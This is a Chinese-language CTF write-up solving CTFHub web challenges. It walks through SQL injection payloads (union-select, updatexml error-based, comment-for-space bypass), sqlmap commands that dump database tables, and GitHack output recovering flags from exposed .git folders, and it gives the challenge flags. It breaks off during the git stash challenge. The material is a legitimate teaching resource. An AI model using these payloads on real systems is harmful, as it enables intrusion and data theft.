# Web

## Web前置技能

### SQL注入

Web应用开发过程中，为了内容的快速更新，很多开发者使用数据库进行数据存储。而由于开发者在程序编写过程中，传入用户数据的过滤不严格，将可能存在的攻击载荷拼接到SQL查询语句中，再将这些查询语句传递给后端的数据库执行，从而引发实际执行的语句与预期功能不一致的情况。这种攻击被称为**SQL注入攻击**。
大多数应用在开发时将诸如密码等的数据放在数据库中，由于SQL注入攻击能够泄露系统中的敏感信息，使之成为了进入各Web系统的入口级漏洞，因此各大CTF赛事将SQL注入作为Web题目的出题点之一，SQL注入漏洞也是现实场景下最常见的漏洞类型之一。
**SQL注入是开发者对用户输入的参数过滤不严格，导致用户输入的数据能够影响预设查询功能的一种技术，通常将导致数据库的原有信息泄露、篡改，甚至被删除。**

#### 整数型SQL注入

输入1试试？输入1后有俩行回显：一行`ID`一行`Data`。

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/整数型注入/1.png)

`union select`可以进行联合查询，`id=-1`表示一个不存在的`id`，`group_concat()`把产生的同一分组中的值用`,`连接形成一个字符串，`information_schema.schemata`表示`information_schema`库中的一个表名为`schemata`的表，可以在输入框输入以下代码查询所有数据库：

```sql
-1 union select 1,group_concat(schema_name) from information_schema.schemata
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/整数型注入/2.png)

`database()`回显当前连接的数据库，用以下代码可以查询到当前数据库为`sqli`：

```sql
-1 union select 1,database()
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/整数型注入/3.png)

`group_concat()`把产生的同一分组中的值用`,`连接并形成一个字符串，`information_schema.tables`存了`mysql`所有的表，`table_schema`是表对应的数据库名的字段，`table_name`和`table_schema`相对应，用以下代码能够查询到指定数据库的表信息：

```sql
-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema="sqli"
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/整数型注入/4.png)

`information_schema.columns`存了表中所有列的信息，`table_name`和`table_schema`相对应，可以看到有个表叫`flag`，我们可以去查询该表的列信息：

```sql
-1 union select 1,group_concat(column_name) from information_schema.columns where table_name="flag"
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/整数型注入/5.png)

最后输入以下代码根据`flag`字段可以查询到该字段的数据：

```sql
-1 union select 1,group_concat(flag) from sqli.flag
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/整数型注入/6.png)

提交`ctfhub{b797799cfa5883e9255774f0}`即可。

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/整数型注入/7.png)

------

#### 字符型注入

输入1试试？输入1后有俩行回显：一行`ID`一行`Data`，可以看到是`ID`是字符型。

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/字符型注入/1.png)

`database()`回显当前连接的数据库，用`#`注释掉后面的那一个`'`，输入以下代码可以查询到当前数据库为`sqli`：

```sql
-1' union select 1,database()#
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/字符型注入/2.png)

`group_concat()`把产生的同一分组中的值用`,`连接并形成一个字符串，`information_schema.tables`存了`mysql`所有的表，`table_schema`是表对应的数据库名的字段，`table_name`和`table_schema`相对应，输入以下代码能够查询到指定数据库的表信息：

```sql
-1' union select 1,group_concat(table_name) from information_schema.tables where table_schema='sqli'#
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/字符型注入/3.png)

`information_schema.columns`存了表中所有列的信息，`table_name`和`table_schema`相对应，上图查询到有个表叫`flag`，我们可以去查询该表的列信息：

```sql
-1' union select 1,group_concat(column_name) from information_schema.columns where table_name='flag'#
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/字符型注入/4.png)

最后输入以下代码根据`flag`字段可以查询到该字段的数据：

```sql
-1' union select 1,group_concat(flag) from sqli.flag#
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/字符型注入/5.png)

提交`ctfhub{7c61389921cf96d14f3df6f9}`即可。

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/字符型注入/6.png)

------

#### 报错注入

**某些网站为了方便开发者调试会开启错误调试信息，只要此时触发SQL语句的错误就能在页面上看到SQL语句执行后的报错信息，这种攻击方式被称为报错注入。**

输入1试试？输入1后只有一行回显：查询正确。

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/报错注入/1.png)

通过查阅相关文档可知`updatexml()`在执行时，第二个参数应该是合法的XPATH路径，否则将会在引发报错的同时将传入的参数进行输出。`database()`回显当前连接的数据库，输入以下代码可以查询到当前数据库：

```sql
1 and (updatexml(1,concat(0x7e,(database()),0x7e),1))
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/报错注入/2.png)

`group_concat()`把产生的同一分组中的值用`,`连接并形成一个字符串，`information_schema.tables`存了`mysql`所有的表，`table_schema`是表对应的数据库名的字段，`table_name`和`table_schema`相对应，输入以下代码能够查询到指定数据库的表信息：

```sql
1 union select updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='sqli'),0x7e),1)
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/报错注入/3.png)

`information_schema.columns`存了表中所有列的信息，`table_name`和`table_schema`相对应，上图查询到有个表叫`flag`，我们可以去查询该表的列信息：

```sql
1 union select updatexml(1,concat(0x7e, (select group_concat(column_name) from information_schema.columns where table_name='flag')  ,0x7e),1)
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/报错注入/4.png)

最后输入以下代码根据`flag`字段可以查询到该字段的数据：

```sql
1 union select updatexml(1,concat(0x7e, (select group_concat(flag) from sqli.flag)  ,0x7e),1)
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/报错注入/5.png)

提交`ctfhub{ce93ca39df4e9cbeee0c79c5}`即可。

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/报错注入/6.png)

------

#### 布尔盲注

这道题如果真的盲注的话会很费劲，直接启动`Kali-Linux`用`sqlmap`爆破就完事啦。

爆破出当前数据库的名字。

```sql
sqlmap -u "http://challenge-68c4a9c7f10ce011.sandbox.ctfhub.com:10800/?id=1" --current-db
#可以得到如下有用的结果信息(简洁版)
current database: 'sqli'
```

得到数据库名后继续爆破表信息：

```bash
sqlmap -u "http://challenge-68c4a9c7f10ce011.sandbox.ctfhub.com:10800/?id=1" -D sqli --tables
#可以得到如下有用的结果信息(简洁版)
+------+
| flag |
+------+
| news |
+------+
```

知道有个叫`flag`的表后，可以查看该表的字段信息：

```bash
sqlmap -u "http://challenge-68c4a9c7f10ce011.sandbox.ctfhub.com:10800/?id=1" -D sqli -T flag --columns
#可以得到如下有用的结果信息(简洁版)
+-----------------------+
| Column | Type         |
+-----------------------+
| flag   | varchar(100) |
+-----------------------+
```

最后输入以下代码根据`flag`字段可以查询到该字段的数据：

```bash
sqlmap -u "http://challenge-68c4a9c7f10ce011.sandbox.ctfhub.com:10800/?id=1" -D sqli -T flag -C flag --dump
#可以得到如下有用的结果信息(简洁版)
+----------------------------------+
| flag                             |
+----------------------------------+
| ctfhub{64a098acea7e72aefc09810f} |
+----------------------------------+
```

提交`ctfhub{64a098acea7e72aefc09810f}`即可。

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/布尔盲注/1.png)

------

#### 时间盲注

时间盲注攻击是利用`sleep()`或`benchmark()`等函数让`mysql`执行时间变长，经常与`if(expr1,expr2,expr3)`语句结合使用，通过页面的响应时间来判断条件是否正确。`if(expr1,expr2,expr3)`含义是：如果`expr1`为`True`则返回`expr2`，否则返回`expr3`。

这道题如果真的盲注的话会很费劲，直接启动`Kali-Linux`用`sqlmap`爆破就完事啦。

```sql
sqlmap -u "http://challenge-eccdebff49cb9b7c.sandbox.ctfhub.com:10800/?id=1" -D sqli -T flag --columns --dump
#可以得到如下有用的结果信息(简洁版)
+----------------------------------+
| flag                             |
+----------------------------------+
| ctfhub{661f441db8300ee13ac86d2b} |
+----------------------------------+
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/时间盲注/1.png)

提交`ctfhub{661f441db8300ee13ac86d2b}`即可。

------

#### MySQL结构

输入1试试？输入1后有俩行回显：一行`ID`一行`Data`。

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/MySQL结构/1.png)

`union select`可以进行联合查询，`id=-1`表示一个不存在的`id`，`group_concat()`把产生的同一分组中的值用`,`连接形成一个字符串，`information_schema.schemata`表示`information_schema`库中的一个表名为`schemata`的表，可以在输入框输入以下代码查询所有数据库：

```sql
-1 union select 1,group_concat(schema_name) from information_schema.schemata
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/MySQL结构/2.png)

`database()`回显当前连接的数据库，用以下代码可以查询到当前数据库为`sqli`：

```bash
-1 union select 1,database()
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/MySQL结构/3.png)

`group_concat()`把产生的同一分组中的值用`,`连接并形成一个字符串，`information_schema.tables`存了`mysql`所有的表，`table_schema`是表对应的数据库名的字段，`table_name`和`table_schema`相对应，输入以下代码能够查询到指定数据库的表信息：

```sql
-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema="sqli"
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/MySQL结构/4.png)

`information_schema.columns`存了表中所有列的信息，`table_name`和`table_schema`相对应，上图查询到有个表叫`dmyireyrij`，我们可以去查询该表的列信息：

```sql
-1 union select 1,group_concat(column_name) from information_schema.columns where table_name="dmyireyrij"
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/MySQL结构/5.png)

上图查询到表`dmyireyrij`中有个列叫`wqnbddiwzu`，最后输入以下代码根据`flag`字段可以查询到该字段的数据：

```sql
-1 union select 1,group_concat(wqnbddiwzu) from sqli.dmyireyrij
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/MySQL结构/6.png)

提交`ctfhub{a251a62c47aa8b3c139cf2e4}`即可。

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/MySQL结构/7.png)

------

#### Cookie注入

**解法1：**`Burp Suite`

首先用`Burp Suite`抓包`id%E8%BE%93%E5%85%A51%E8%AF%95%E8%AF%95%EF%BC%9F`进行`url`解码结果为`id输入1试试？`。

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Cookie注入/1.png)

`union select`可以进行联合查询，`id=-1`表示一个不存在的`id`，`database()`回显当前连接的数据库，修改`Cookie`为以下代码可以查询到当前数据库为`sqli`：

```sql
id=-1 union select 1, database();
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Cookie注入/2.png)

`group_concat()`把产生的同一分组中的值用`,`连接并形成一个字符串，`information_schema.tables`存了`mysql`所有的表，`table_schema`是表对应的数据库名的字段，`table_name`和`table_schema`相对应，用以下代码能够查询到指定数据库的表信息：

```sql
id=-1 union select 1, group_concat(table_name) from information_schema.tables where table_schema='sqli';
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Cookie注入/3.png)

`information_schema.columns`存了表中所有列的信息，`table_name`和`table_schema`相对应，可以看到有个表叫`gsilsvtvjn`，我们可以去查询该表的列信息：

```sql
id=-1 union select 1, group_concat(column_name) from information_schema.columns where table_name='gsilsvtvjn';
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Cookie注入/4.png)

最后输入以下代码根据`ywcxnnlyfe`字段可以查询到该字段的数据：

```sql
id=-1 union select 1, group_concat(ywcxnnlyfe) from sqli.gsilsvtvjn;
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Cookie注入/5.png)

提交`ctfhub{9a3c5a851a615b8332cbe20b}`即可。

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Cookie注入/6.png)

------

**解法2：**`sqlmap`

`sqlmap`中有一个参数是`--level`，表示探测等级，其默认值为`1`，`level>=2`时会检测`Cookie`注入，`level>=3`时会检测`User-Agent`注入和`Referer`注入，`level>=5`时会检测`host`注入。以下代码可以爆破出当前网站中的所有数据库：

```sql
sqlmap -u "http://challenge-40986a7ba9926439.sandbox.ctfhub.com:10800/" --cookie "id=1" --level 2 --dbs
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Cookie注入/7.png)

爆破出当前数据库的名字：

```sql
sqlmap -u "http://challenge-40986a7ba9926439.sandbox.ctfhub.com:10800/" --cookie "id=1" --level 2 --current-db
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Cookie注入/8.png)

得到数据库名`sqli`后继续爆破表信息：

```sql
sqlmap -u "http://challenge-40986a7ba9926439.sandbox.ctfhub.com:10800/" --cookie "id=1" --level 2 -D sqli --tables
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Cookie注入/9.png)

知道有个叫`gsilsvtvjn`的表后，可以查看该表的字段信息：

```sql
sqlmap -u "http://challenge-40986a7ba9926439.sandbox.ctfhub.com:10800/" --cookie "id=1" --level 2 -D sqli -T gsilsvtvjn --columns
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Cookie注入/10.png)

最后输入以下代码根据`ywcxnnlyfe`字段可以查询到该字段的数据：

```sql
sqlmap -u "http://challenge-40986a7ba9926439.sandbox.ctfhub.com:10800/" --cookie "id=1" --level 2 -D sqli -T gsilsvtvjn -C ywcxnnlyfe --dump 
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Cookie注入/11.png)

提交`ctfhub{9a3c5a851a615b8332cbe20b}`即可。

------

#### UA注入

**解法1：**`Burp Suite`

`union select`可以进行联合查询，`id=-1`表示一个不存在的`id`，`database()`回显当前连接的数据库，修改`User-Agent`为以下代码可以查询到当前数据库为`sqli`：

```sql
-1 union select 1, database()
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/UA注入/1.png)

`group_concat()`把产生的同一分组中的值用`,`连接并形成一个字符串，`information_schema.tables`存了`mysql`所有的表，`table_schema`是表对应的数据库名的字段，`table_name`和`table_schema`相对应，用以下代码能够查询到指定数据库的表信息：

```sql
-1 union select 1, group_concat(table_name) from information_schema.tables where table_schema='sqli'
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/UA注入/2.png)

`information_schema.columns`存了表中所有列的信息，`table_name`和`table_schema`相对应，可以看到有个表叫`ulxbfmsgqx`，我们可以去查询该表的列信息：

```sql
-1 union select 1, group_concat(column_name) from information_schema.columns where table_name='ulxbfmsgqx'
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/UA注入/3.png)

最后输入以下代码根据`zpmjyijptn`字段可以查询到该字段的数据：

```sql
-1 union select 1, group_concat(zpmjyijptn) from sqli.ulxbfmsgqx
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/UA注入/4.png)

提交`ctfhub{85809c1cc35e607a1b7fed0a}`即可。

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/UA注入/5.png)

------

**解法2：**`sqlmap`

`sqlmap`中有一个参数是`--level`，表示探测等级，其默认值为`1`，`level>=2`时会检测`Cookie`注入，`level>=3`时会检测`User-Agent`注入和`Referer`注入，`level>=5`时会检测`host`注入。以下代码可以爆破出当前网站中的所有数据库：

```bash
sqlmap -u "http://challenge-c89ea44d56d68a09.sandbox.ctfhub.com:10800/" --level 3 --dbs
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/UA注入/6.png)

爆破出当前数据库的名字：

```bash
sqlmap -u "http://challenge-c89ea44d56d68a09.sandbox.ctfhub.com:10800/" --level 3 --current-db
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/UA注入/7.png)

得到数据库名`sqli`后继续爆破表信息：

```sql
sqlmap -u "http://challenge-c89ea44d56d68a09.sandbox.ctfhub.com:10800/" --level 3 -D sqli --tables
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/UA注入/8.png)

知道有个叫`ulxbfmsgqx`的表后，可以查看该表的字段信息：

```sql
sqlmap -u "http://challenge-c89ea44d56d68a09.sandbox.ctfhub.com:10800/" --level 3 -D sqli -T ulxbfmsgqx --columns
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/UA注入/9.png)

最后输入以下代码根据`zpmjyijptn`字段可以查询到该字段的数据：

```sql
sqlmap -u "http://challenge-c89ea44d56d68a09.sandbox.ctfhub.com:10800/" --level 3 -D sqli -T ulxbfmsgqx -C zpmjyijptn --dump
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/UA注入/10.png)

提交`ctfhub{85809c1cc35e607a1b7fed0a}`即可。


------

#### Refer注入

**解法1：**`Burp Suite`

`union select`可以进行联合查询，`id=-1`表示一个不存在的`id`，`database()`回显当前连接的数据库，修改`Referer`为以下代码可以查询到当前数据库为`sqli`：

```sql
-1 union select 1, database()
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Refer注入/1.png)

`group_concat()`把产生的同一分组中的值用`,`连接并形成一个字符串，`information_schema.tables`存了`mysql`所有的表，`table_schema`是表对应的数据库名的字段，`table_name`和`table_schema`相对应，用以下代码能够查询到指定数据库的表信息：

```sql
-1 union select 1, group_concat(table_name) from information_schema.tables where table_schema='sqli'
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Refer注入/2.png)

`information_schema.columns`存了表中所有列的信息，`table_name`和`table_schema`相对应，可以看到有个表叫`dirxpetuan`，我们可以去查询该表的列信息：

```sql
-1 union select 1, group_concat(column_name) from information_schema.columns where table_name='dirxpetuan'
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Refer注入/3.png)

最后输入以下代码根据`jfsxcgbxrx`字段可以查询到该字段的数据：

```sql
-1 union select 1, group_concat(jfsxcgbxrx) from sqli.dirxpetuan
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Refer注入/4.png)

提交`ctfhub{e82d7ab14d58dd03f08c3ce4}`即可。

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Refer注入/5.png)

------

**解法2：**`sqlmap`

`sqlmap`中有一个参数是`--level`，表示探测等级，其默认值为`1`，`level>=2`时会检测`Cookie`注入，`level>=3`时会检测`User-Agent`注入和`Referer`注入，`level>=5`时会检测`host`注入。以下代码可以爆破出当前网站中的所有数据库：

```bash
sqlmap -u "http://challenge-72f077dfbff2b932.sandbox.ctfhub.com:10800/" --level 3 --dbs
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Refer注入/6.png)

爆破出当前数据库的名字：

```bash
sqlmap -u "http://challenge-72f077dfbff2b932.sandbox.ctfhub.com:10800/" --level 3 --current-db
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Refer注入/7.png)

得到数据库名`sqli`后继续爆破表信息：

```bash
sqlmap -u "http://challenge-72f077dfbff2b932.sandbox.ctfhub.com:10800/" --level 3 -D sqli --tables
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Refer注入/8.png)

知道有个叫`dirxpetuan`的表后，可以查看该表的字段信息：

```bash
sqlmap -u "http://challenge-72f077dfbff2b932.sandbox.ctfhub.com:10800/" --level 3 -D sqli -T dirxpetuan --columns
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Refer注入/9.png)

最后输入以下代码根据`jfsxcgbxrx`字段可以查询到该字段的数据：

```bash
sqlmap -u "http://challenge-72f077dfbff2b932.sandbox.ctfhub.com:10800/" --level 3 -D sqli -T dirxpetuan -C jfsxcgbxrx --dump
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Refer注入/10.png)

提交`ctfhub{e82d7ab14d58dd03f08c3ce4}`即可。

------

#### 空格过滤

输入1试试？输入1后有俩行回显：一行`ID`一行`Data`。

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/空格过滤/1.png)

当`sql`中的空格被过滤时可以用`/**/`来代替。`database()`回显当前连接的数据库，用以下代码可以查询到当前数据库为`sqli`：

```sql
-1/**/union/**/select/**/1,database()
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/空格过滤/2.png)

`group_concat()`把产生的同一分组中的值用`,`连接并形成一个字符串，`information_schema.tables`存了`mysql`所有的表，`table_schema`是表对应的数据库名的字段，`table_name`和`table_schema`相对应，用以下代码能够查询到指定数据库的表信息：

```sql
-1/**/union/**/select/**/1,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema='sqli'
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/空格过滤/3.png)

`information_schema.columns`存了表中所有列的信息，`table_name`和`table_schema`相对应，可以看到有个表叫`nbadikctna`，我们可以去查询该表的列信息：

```bash
-1/**/union/**/select/**/1,group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name='nbadikctna'
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/空格过滤/4.png)

最后输入以下代码根据`vuafekfves`字段可以查询到该字段的数据：

```sql
-1/**/union/**/select/**/1,group_concat(vuafekfves)/**/from/**/sqli.nbadikctna
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/空格过滤/5.png)

提交`ctfhub{12917a7f5475c0de901aec7c}`即可。

------

### 信息泄露

#### Git泄露

##### Log

> 当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当,可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。请尝试使用BugScanTeam的GitHack完成本题

根据题目描述使用`GitHack`获取`.git`文件夹。

```bash
┌──(tyd㉿Kali)-[~/ctf]
└─$ git clone https://github.com/BugScanTeam/GitHack.git

┌──(tyd㉿Kali)-[~/ctf]
└─$ cd GitHack   

┌──(tyd㉿Kali)-[~/ctf/GitHack]
└─$ python2 GitHack.py http://challenge-86088fe5e4711df9.sandbox.ctfhub.com:10800/.git

  ____ _ _   _   _            _                                            
 / ___(_) |_| | | | __ _  ___| | __                                        
| |  _| | __| |_| |/ _` |/ __| |/ /                                        
| |_| | | |_|  _  | (_| | (__|   <                                         
 \____|_|\__|_| |_|\__,_|\___|_|\_\{0.0.5}                                 
 A '.git' folder disclosure exploit.                                       
                                                                           
[*] Check Depends
[+] Check depends end
[*] Set Paths
[*] Target Url: http://challenge-86088fe5e4711df9.sandbox.ctfhub.com:10800/.git/                                                                      
[*] Initialize Target
[*] Try to Clone straightly
[*] Clone
正克隆到 '/home/tyd/ctf/GitHack/dist/challenge-86088fe5e4711df9.sandbox.ctfhub.com_10800'...
致命错误：仓库 'http://challenge-86088fe5e4711df9.sandbox.ctfhub.com:10800/.git/' 未找到
[-] Clone Error
[*] Try to Clone with Directory Listing
[*] http://challenge-86088fe5e4711df9.sandbox.ctfhub.com:10800/.git/ is not support Directory Listing                                                 
[-] [Skip][First Try] Target is not support Directory Listing
[*] Try to clone with Cache
[*] Initialize Git
[!] Initialize Git Error: 提示：使用 'master' 作为初始分支的名称。这个默认分支名称可能会更改。要在新仓库中                                           
提示：配置使用初始分支名，并消除这条警告，请执行：                         
提示：                                                                     
提示：  git config --global init.defaultBranch <名称>                      
提示：                                                                     
提示：除了 'master' 之外，通常选定的名字有 'main'、'trunk' 和 'development'。                                                                         
提示：可以通过以下命令重命名刚创建的分支：                                 
提示：                                                                     
提示：  git branch -m <name>                                               
                                                                           
[*] Cache files
[*] packed-refs
[*] config
[*] HEAD
[*] COMMIT_EDITMSG
[*] ORIG_HEAD
[*] FETCH_HEAD
[*] refs/heads/master
[*] refs/remote/master
[*] index
[*] logs/HEAD
[*] logs/refs/heads/master
[*] Fetch Commit Objects
[*] objects/05/4002c4fd9c95edfaa91ba505b6d1dd8f680b32
[*] objects/01/2ae1fc6b838a345b689ae6bb4ec0edfd517a64
[*] objects/2c/1e32dfd33267f265fda913d29e29572c2ba0be
[*] objects/58/1bd5a9f51c3a1ba88014543f3c390c8542fde7
[*] objects/90/71e0a24f654c88aa97a2273ca595e301b7ada5
[*] objects/2c/59e3024e3bc350976778204928a21d9ff42d01
[*] objects/54/adac7f5e33aa6122e1c7b04e05cf2c03363c55
[*] objects/8b/1cb6b6cccaccbac8560385b1300c5494369a16
[*] Fetch Commit Objects End
[*] logs/refs/remote/master
[*] logs/refs/stash
[*] refs/stash
[*] Valid Repository
[+] Valid Repository Success

[+] Clone Success. Dist File : /home/tyd/ctf/GitHack/dist/challenge-86088fe5e4711df9.sandbox.ctfhub.com_10800

┌──(tyd㉿Kali)-[~/ctf/GitHack]
└─$ cd dist/challenge-86088fe5e4711df9.sandbox.ctfhub.com_10800                                                                                      
┌──(tyd㉿Kali)-[~/ctf/GitHack/dist/challenge-86088fe5e4711df9.sandbox.ctfhub.com_10800]
└─$ git log                                             
commit 054002c4fd9c95edfaa91ba505b6d1dd8f680b32 (HEAD -> master)
Author: CTFHub <sandbox@ctfhub.com>
Date:   Fri Jul 21 12:09:55 2023 +0000

    remove flag

commit 2c1e32dfd33267f265fda913d29e29572c2ba0be
Author: CTFHub <sandbox@ctfhub.com>
Date:   Fri Jul 21 12:09:54 2023 +0000

    add flag

commit 54adac7f5e33aa6122e1c7b04e05cf2c03363c55
Author: CTFHub <sandbox@ctfhub.com>
Date:   Fri Jul 21 12:09:54 2023 +0000

    init

┌──(tyd㉿Kali)-[~/ctf/GitHack/dist/challenge-86088fe5e4711df9.sandbox.ctfhub.com_10800]
└─$ git diff 2c1e32dfd33267f265fda913d29e29572c2ba0be
diff --git a/226282577915965.txt b/226282577915965.txt
deleted file mode 100644
index 8b1cb6b..0000000
--- a/226282577915965.txt
+++ /dev/null
@@ -1 +0,0 @@
-ctfhub{21b194cfff1432ef1c38d79c}

# git diff查看版本间更改，得到flag：ctfhub{21b194cfff1432ef1c38d79c}
# 此外还可以 git reset --hard

┌──(tyd㉿Kali)-[~/ctf/GitHack/dist/challenge-86088fe5e4711df9.sandbox.ctfhub.com_10800]
└─$ git reset --hard 2c1e32dfd33267f265fda913d29e29572c2ba0be
HEAD 现在位于 2c1e32d add flag
                                                                           
┌──(tyd㉿Kali)-[~/ctf/GitHack/dist/challenge-86088fe5e4711df9.sandbox.ctfhub.com_10800]
└─$ ls
226282577915965.txt  50x.html  index.html
                                                                           
┌──(tyd㉿Kali)-[~/ctf/GitHack/dist/challenge-86088fe5e4711df9.sandbox.ctfhub.com_10800]
└─$ cat 226282577915965.txt                                     
ctfhub{21b194cfff1432ef1c38d79c}
```

提交`ctfhub{21b194cfff1432ef1c38d79c}`即可。

------

##### Stash

> 当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当,可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。请尝试使用BugScanTeam的GitHack完成本题

这题和上题的区别就在于：使用`git stash pop `恢复文件。

```bash
┌──(tyd㉿Kali)-[~/ctf/GitHack]
└─$ python2 GitHack.py http://challenge-053bfbe9e957dbd0.sandbox.ctfhub.com:10800/.git

  ____ _ _   _   _            _                                             
 / ___(_) |_| | | | __ _  ___| | __                                         
| |  _| | __| |_| |/ _` |/ __| |/ /                                         
| |_| | | |_|  _  | (_| | (__|   <                                          
 \____|_|\__|_| |_|\__,_|\___|_|\_\{0.0.5}                                  
 A '.git' folder disclosure exploit.                                        
                                                                            
[*] Check Depends
[+] Check depends end
[*] Set Paths
[*] Target Url: http://challenge-053bfbe9e957dbd0.sandbox.ctfhub.com:10800/.git/                                                                        
[*] Initialize Target
[*] Try to Clone straightly
[*] Clone
正克隆到 '/home/tyd/ctf/GitHack/dist/challenge-053bfbe9e957dbd0.sandbox.ctfhub.com_10800'...
致命错误：仓库 'http://challenge-053bfbe9e957dbd0.sandbox.ctfhub.com:10800/.git/' 未找到
[-] Clone Error
[*] Try to Clone with Directory Listing
[*] http://challenge-053bfbe9e957dbd0.sandbox.ctfhub.com:10800/.git/ is not support Directory Listing                                                   
[-] [Skip][First Try] Target is not support Directory Listing
[*] Try to clone with Cache
[*] Initialize Git
[!] Initialize Git Error: 提示：使用 'master' 作为初始分支的名称。这个默认分支名称可能会更改。要在新仓库中                                              
提示：配置使用初始分支名，并消除这条警告，请执行：                          
提示：                                                                      
提示：  git config --global init.defaultBranch <名称>                       
提示：                                                                      
提示：除了 'master' 之外，通常选定的名字有 'main'、'trunk' 和 'development' 。                                                                          
提示：可以通过以下命令重命名刚创建的分支：                                  
提示：                                                                      
提示：  git branch -m <name>                                                
                                                                            
[*] Cache files
[*] packed-refs
[*] config
[*] HEAD
[*] COMMIT_EDITMSG
[*] ORIG_HEAD
[*] FETCH_HEAD
[*] refs/heads/master
[*] refs/remote/master
[*] index
[*] logs/HEAD
[*] logs/refs/heads/master
[*] Fetch Commit Objects
[*] objects/2a/f4c55fd7a6e64762c583aa9e751b4048797cce
[*] objects/01/2ae1fc6b838a345b689ae6bb4ec0edfd517a64
[*] objects/da/610ebc4966063d73e2b6803ac14eb733d0fd13
[*] objects/76/393a7c85d8e8684f642345caf7dad19f000dfe
[*] objects/90/71e0a24f654c88aa97a2273ca595e301b7ada5
[*] objects/2c/59e3024e3bc350976778204928a21d9ff42d01
[*] objects/3d/7e73de132599e19f299844b23d115766c6bcc8
[*] objects/e3/58b09f4cb4e5800dd20e1aa6758bf80811001a
[*] Fetch Commit Objects End
[*] logs/refs/remote/master
[*] logs/refs/stash
[*] refs/stash
[*] Fetch Commit Objects
[*] objects/ea/8bccfc4d373b4ce4e69b9b038cae032aa27d71
[*] objects/7d/5628506a1cd9320aff8ee5ac48cbe9dadafc49
[*] objects/b6/2e1547700bda5aa20e86b97a5d554f413596df
[*] objects/80/705095c27dc16b00ae0469451f44a3bf78faf8
[*] Fetch Commit Objects End
[*] Valid Repository
[+] Valid Repository Success

[+] Clone Success. Dist File : /home/tyd/ctf/GitHack/dist/challenge-053bfbe9e957dbd0.sandbox.ctfhub.com_10800

┌──(tyd㉿Kali)-[~/ctf/GitHack]
└─$ cd dist/challenge-053bfbe9e957dbd0.sandbox.ctfhub.com_10800 
                                                                            
┌──(tyd㉿Kali)-[~/ctf/GitHack/dist/challenge-053bfbe9e957dbd0.sandbox.ctfhub.com_10800]
└─$ git log
